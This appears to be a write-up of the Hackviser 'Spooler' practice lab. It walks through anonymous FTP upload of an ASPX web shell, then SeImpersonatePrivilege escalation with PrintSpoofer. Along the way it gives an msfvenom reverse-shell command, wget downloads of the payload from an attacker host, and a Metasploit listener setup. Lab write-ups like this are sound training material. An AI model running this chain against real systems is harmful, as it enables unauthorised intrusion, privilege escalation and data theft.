---
title: 'Spooler'
date: '2026-03-01'
excerpt: 'Practice stealing tokens by exploiting misconfigured services on the system and performing token manipulation and privilege escalation attacks with the stolen token.'
prog: 'Hackviser Warmup Stage 3 -  2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_logo.png" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Spooler</h1>
<div class="writeup-date">March 2026 &middot; Warmup Stage 3</div>
</div>
</div>
<p class="lead mb-4">Windows systems use tokens to manage the privileges of users. These tokens determine what kind of operations users can perform on the system. It is recommended to practice stealing tokens by exploiting misconfigured services on the system and performing token manipulation and privilege escalation attacks with the stolen token.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the version of the service running on port 80?</p>
<p class="mb-3">Use nmap to scan the target machine and identify open ports with <code>nmap -sC -sV -A [target IP]</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image1.png" alt="Spooler 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image2.png" alt="Spooler 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Microsoft IIS httpd 10.0</p>
<br />

<p class="mb-2"><strong>Question 2:</strong> What is the file path of the folder shared via FTP?</p>
<p class="mb-3">For this lab, we will be using <a href="https://github.com/ThePacketBender/webshells/blob/master/POWERshell.aspx" target="_blank" referrerpolicy="no-referrer">POWERshell.aspx</a> by ThePacketBender.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image3.png" alt="Spooler 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Let's attempt to connect to the FTP server using Anonymous login. Then we upload the POWERshell.aspx file.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image4.png" alt="Spooler 4" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">We will use Gobuster to enumerate directories and files on the web server.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image5.png" alt="Spooler 5" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Since we found that the web server has a directory for FTP uploads, we can access the uploaded POWERshell.aspx file by clicking on it.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image6.png" alt="Spooler 6" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Running <code>whoami</code> reveals the current user.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image7.png" alt="Spooler 7" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Use <code>Get-ChildItem -Path C:\ -Recurse -Directory -ErrorAction SilentlyContinue -Filter "ftp"</code> to find the file path of the folder shared via FTP.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image8.png" alt="Spooler 8" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> C:\inetpub\wwwroot\ftp</p>
<br />

<p class="mb-2"><strong>Question 3:</strong> What is the username of the account belonging to the software support specialist?</p>
<p class="mb-3">In the PowerShell input, enter <code>Get-LocalUser</code> to see the list of local users.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image9.png" alt="Spooler 9" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> liam</p>
<br />

<p class="mb-2"><strong>Question 4:</strong> Which group is user Liam in?</p>
<p class="mb-3">Run <code>net user liam</code> to see the groups the user belongs to.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image10.png" alt="Spooler 10" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> TechSupport</p>
<br />

<p class="mb-2"><strong>Question 5:</strong> What is the first and last name of Liam's customer with ID 4218 in the directory C:\users\liam\Desktop\clients?</p>
<p class="mb-3">Run <code>whoami /priv</code> to check the privileges of the current user.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image11.png" alt="Spooler 11" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Since our current user has the SeImpersonatePrivilege token enabled, we will use <a href="https://github.com/itm4n/PrintSpoofer" target="_blank" referrerpolicy="no-referrer">the PrintSpoofer exploit</a>. We also need a reverse shell generated with msfvenom to gain a privileged shell by running this exploit. First, let's generate the required exe file by running the following command: <code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[attacker IP] lport=[attacker port] -f exe > meterpreter.exe</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image12.png" alt="Spooler 12" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Opening <code>http://[attacker_IP]:8080</code> in the browser confirms that our Python HTTP server is accessible.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image13.png" alt="Spooler 13" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Next, download meterpreter.exe using <code>wget http://[attacker_IP]:8080/meterpreter.exe -OutFile C:\Windows\Temp\meterpreter.exe</code> in the PowerShell. We will also serve another Python HTTP server from the folder that contains the PrintSpoofer exploit, so that it can be downloaded onto the target machine by using <code>wget http://[attacker_IP]:8080/PrintSpoofer64.exe -OutFile C:\Windows\Temp\PrintSpoofer64.exe</code> in the PowerShell. Once the files are downloaded and saved to the Temp folder, we can confirm this by running <code>Get-ChildItem -Path C:\Windows\Temp</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image14.png" alt="Spooler 14" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Before running the exploit, we need to open msfconsole and switch to listening mode. In msfconsole, run <code>use exploit/multi/handler</code> and set the payload to <code>windows/x64/meterpreter/reverse_tcp</code>. Then, set the LHOST and LPORT to match the attacker's IP and port, and finally run <code>exploit</code>. Then in the PowerShell, run <code>C:\Windows\Temp\PrintSpoofer64.exe -i -c "C:\Windows\Temp\meterpreter.exe"</code>. A meterpreter session will open. Confirm it with <code>getuid</code>, then change directory to the clients folder and read the text file.</p>
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image15.png" alt="Spooler 15" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<img src="/assets/hackinglabs/hackviser/warmups/spooler/spooler_hackviser_image16.png" alt="Spooler 16" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3"></p>
<p class="mb-5"><strong>Answer:</strong> Jordan Smith</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">March 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>